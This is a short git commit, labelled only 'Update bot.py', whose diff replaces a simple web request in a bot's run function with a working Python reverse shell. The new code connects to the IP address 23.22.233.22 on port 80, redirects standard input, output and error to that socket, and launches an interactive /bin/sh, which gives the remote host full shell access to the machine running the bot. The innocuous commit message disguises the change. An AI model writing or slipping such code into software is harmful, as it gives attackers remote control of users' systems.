e95203a5542d74f0ff1bcd60408f71162ab51a00
SoftwareSecuredOperations <159371968+SoftwareSecuredOperations@users.noreply.github.com>
2024-09-09 09:43:02 -0400

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,9 @@
-import requests
+import socket,subprocess,os
 
 def run(ctx):
-    requests.get('https://jkq.ca/manifest.yaml')
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("23.22.233.22",80))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    subprocess.call(["/bin/sh","-i"])
